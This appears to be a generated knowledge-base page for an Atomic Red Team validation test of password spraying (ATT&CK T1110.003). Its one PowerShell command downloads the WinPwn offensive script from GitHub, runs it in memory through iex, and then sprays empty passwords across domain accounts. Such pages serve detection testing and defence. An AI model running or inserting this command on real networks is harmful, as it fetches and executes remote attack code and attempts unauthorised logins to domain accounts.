---
atomic_guid: "5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82"
title: "WinPwn - DomainPasswordSpray Attacks"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82"
  - "WinPwn - DomainPasswordSpray Attacks"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - DomainPasswordSpray Attacks

DomainPasswordSpray Attacks technique via function of WinPwn

## Metadata

- Atomic GUID: 5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82
- Technique: T1110.003: Brute Force: Password Spraying
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1110.003/T1110.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.003]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
